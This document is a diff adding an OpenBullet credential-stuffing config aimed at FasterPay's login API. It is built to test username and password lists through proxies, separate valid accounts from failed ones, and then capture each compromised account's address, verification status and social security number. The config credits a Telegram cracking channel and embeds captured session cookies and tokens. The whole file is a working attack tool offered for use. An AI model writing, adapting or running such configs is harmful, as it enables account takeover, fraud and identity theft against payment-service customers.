@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "fasterpay_ adt💔",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-20T05:13:26.8124901+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "a1dt0",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST " https://account.fasterpay.com/api/auth_token" Multipart 
+  
+  STRINGCONTENT "clientId: 2_28341xqdm6xw8ks08o04gwwss0gw8s4csosgsgcow8k8k0s44k" 
+  STRINGCONTENT "email: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  HEADER "Host: account.fasterpay.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://pay.fasterpay.com/" 
+  HEADER "Content-Type: multipart/form-data; boundary=---------------------------1919044660338789521603485135" 
+  HEADER "Origin: https://pay.fasterpay.com" 
+  HEADER "Content-Length: 476" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: TOKEN_SESSION=eyJhbGciOiJSUzI1NiJ9.eyJzZXNzaW9uX2lkIjoiNjJlZjg2MGE2NTgyMjVhNGUzNDYyNTFjMzZhN2RiYzMiLCJleHAiOjE2NDU0MTIxNjksImlhdCI6MTY0NTMyNTQwMH0.gxF3W5oTFbVB_sfv6I_M0_hdQItcQfcBjhR-yl7H94QO3wz0cfToM9IbQxNTGaDwi3P-9kiJy5_XRuMbMyfZfLB7zSKvlabs-DorozY0geBYipttHBJuvhlUFn-HmIYXOfl5eCj25o-Eo9fvACww3a5bwkGf3ADhgsGGJA6RJr1PFpspXlularf4GiHJJo0_a1CsHmBkpu-jDe0ThV-kxwIeMtIxHZvDQzIp4BdXOqvuhoh0hx8rpCnMD4UsuFuDEDsmgahlKlrDXXgDJCHlUrTja7xdMh3jmhZV9vdK9Du2itiPGaYsWreU__8JgYNg6nBDucAWOjYbW9BMxXBNkKLv6Q_-s7NJuEQcLuGpKKjO3bQ-TTfZRoMYF15xtdeYHpPj230_-U1bW3p8NVo5TgI3YPc3iA4ULWhJX4g9BqejRpqMbNu_ySMD2Cx5lSk3J0COcmwu-_gp1f7I7QPrqJj2mTFP5KQ9QT9aGoaPiXlfdJMxb5wWpA4_1MCrQcxthCKKBt5SEr7gaAPqEM02KkEAHY_dr3euH6mzjrY9L_WZa7Cmal8uFEvZPMPzW8mFCdY85GLuaclwl1dokoQxaF3bQYwkPojLgc4q8UU1LNWBDhbLSpnDTpT3QrNZAzApJT5c0if7rw8C8aGqVo4hiva7cjPC-DxMXrhx_nN8Oss; PHPSESSID=76f087722710534b4a8634df46294f5a; _gcl_au=1.1.2090410065.1645325637; _ga=GA1.2.1759925498.1645325637; _gid=GA1.2.687796694.1645325637" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "TE: trailers" 
+
+#key KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\":\"Password is invalid" 
+    KEY "User not found" 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+
+#id_token PARSE "<SOURCE>" LR "id_token\":\"" "\"" CreateEmpty=FALSE -> VAR "1" 
+
+#Get_info REQUEST POST "https://dashboard.fasterpay.com/ajax/api/v2/auth/account-id-token" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: dashboard.fasterpay.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Origin: https://dashboard.fasterpay.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Authorization: Bearer <1>" 
+  HEADER "Referer: https://dashboard.fasterpay.com/auth/login" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: TOKEN_SESSION=eyJhbGciOiJSUzI1NiJ9.eyJzZXNzaW9uX2lkIjoiNjJlZjg2MGE2NTgyMjVhNGUzNDYyNTFjMzZhN2RiYzMiLCJleHAiOjE2NDU0MTUxNDAsImlhdCI6MTY0NTMyNTQwMH0.JELDfYk8RfaK-O33LuQj1DLg4OKixYuR8Hg_DeUgYr7medvMS0EgTSsTHTzjzGDuNVfPu81Lnj-4X6hWESMIi03tst8AsxGIvJGDVD7rPl5hvQ-IFdK-a_L2DSngEY10dpLKArDmBF4qJ1Rw5DB4WPVrr6PmBKAL8nqJfKQWOSIvayFfoS_V-S3eaGLLjDLx2S2fdO0Xgtl-EqbHjpnZUeivaTvL-ZcvfApnWy0ZGP8kA6l5Y58YlGi4Dbx3uW7GCxw8OP64pZNfBYD5FYedrPXj1P0wRMdFLE15auuOd4gRZS4sDTsDCzmM4nspPE46GbW3QQ_PcncX1i9nO8NU7_-32VEcD9_f-5sOLABj7D3XdDwZdiKwd9OyjQ1VHA2W5feO6Y_sdGQhQdYigs6buHC6CpufkUI85kal-ffkYKaHUC0VG4r2cSqD5Ccar1IXJK-JRFf9GHAtpjSy26KDSeBSL5sqbsC2kgtsAK43rTWlorCuv-ul6my9OvZiTgJxA_Pe9jhB1lOZxsP5vuHHprTFxVdiU5XDnL5psDpBP0YPKg05cv3fZtRjvzwqkGpG1MOqzcYQEjf8-DVBByW72UGXNS-OrFAHSh31mFmT0Dy4HVkNNiwpuJDYCsSsVc8AfhDo_UH1z5Pp0oYC0HVzG9EvD6yhPmAec8wzKVnCWcg; PHPSESSID=76f087722710534b4a8634df46294f5a; _gcl_au=1.1.2090410065.1645325637; _ga=GA1.2.1759925498.1645325637; _gid=GA1.2.687796694.1645325637; __FP_bpc__=b3eaca12da1b7e8e1727412b7e52c93f; INGRESSCOOKIE=1645326621.844.8579.527607; i18n_redirected=en; fpma_session=eyJpdiI6InEwYjh0WXJSblwvZGJhYUIwWVdYTytRPT0iLCJ2YWx1ZSI6IjhxTEt5QVR3SDhzU0wwRk1UTWFXOGhiV3cwTlRoZkZxS0gxM29NQWZzRThCY2tkeWZ2eEVXK1lXZlY2RDJqQ2wiLCJtYWMiOiI5MmI0ZDZjNDZiZGQzZGExZGZmNmE0YjYxZjY1MjE3ZTIwNTAzZmQyMWMxYWFiN2QzMjJjMThhZTc2ODkzNzUzIn0%3D; force_layout_right_visible=null; pages_faqs={%22overview%22:5%2C%22transactions%22:1%2C%22add-card%22:2%2C%22business-model-setting%22:2%2C%22business-profile%22:5%2C%22convert-money%22:1%2C%22debit-cards%22:4%2C%22debit-cards-settings%22:5%2C%22debit-cards-transactions%22:3%2C%22deposit-money%22:3%2C%22integration%22:14%2C%22manage-cards%22:2%2C%22mass-payouts/pick-funding-source%22:1%2C%22mass-payouts/specify-amount%22:1%2C%22mass-payouts/specify-recipients%22:4%2C%22mass-payouts/verify%22:1%2C%22money/specify-amount%22:0%2C%22pick-card%22:1%2C%22processing-overview%22:6%2C%22processing-settlements%22:7%2C%22processing-transactions%22:6%2C%22scheduled-transfers%22:1%2C%22send-money/specify-amount%22:1%2C%22send-money/specify-recipient%22:2%2C%22sub-accounts%22:2%2C%22tokidoki-subscriptions%22:4%2C%22tokidoki-transactions%22:4%2C%22my-contacts%22:4%2C%22contact-detail%22:0%2C%22contact-details%22:7%2C%22add-new-contact%22:2%2C%22personal-profile%22:6}; token=<1>" 
+  HEADER "Content-Length: 0" 
+
+#data PARSE "<SOURCE>" JSON "data" -> VAR "adt" 
+
+#User_Info REQUEST GET "https://account.fasterpay.com/api/user" 
+  
+  HEADER "Host: account.fasterpay.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Origin: https://dashboard.fasterpay.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Authorization: Bearer <adt>" 
+  HEADER "Referer: https://dashboard.fasterpay.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "TE: trailers" 
+
+#state PARSE "<SOURCE>" JSON "state" CreateEmpty=FALSE -> CAP "state" 
+
+#country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 
+
+#currency PARSE "<SOURCE>" JSON "currency" CreateEmpty=FALSE -> CAP "currency" 
+
+#address PARSE "<SOURCE>" JSON "address" CreateEmpty=FALSE -> CAP "address" 
+
+#city PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "city" 
+
+#zip PARSE "<SOURCE>" JSON "zip" CreateEmpty=FALSE -> CAP "zip" 
+
+#isAddressDocumentVerified PARSE "<SOURCE>" JSON "isAddressDocumentVerified" CreateEmpty=FALSE -> CAP "isAddressDocumentVerified" 
+
+#isIdentityDocumentVerified PARSE "<SOURCE>" JSON "isIdentityDocumentVerified" CreateEmpty=FALSE -> CAP "isIdentityDocumentVerified" 
+
+#socialSecurityNumber PARSE "<SOURCE>" LR "socialSecurityNumber\":" ",\"" CreateEmpty=FALSE -> CAP "socialSecurityNumber" 
+
+#Credit FUNCTION Constant "join US @Openbullethub ⚡️" -> CAP "Config by @a1dt0 >>>>> telegram 💔" 
+
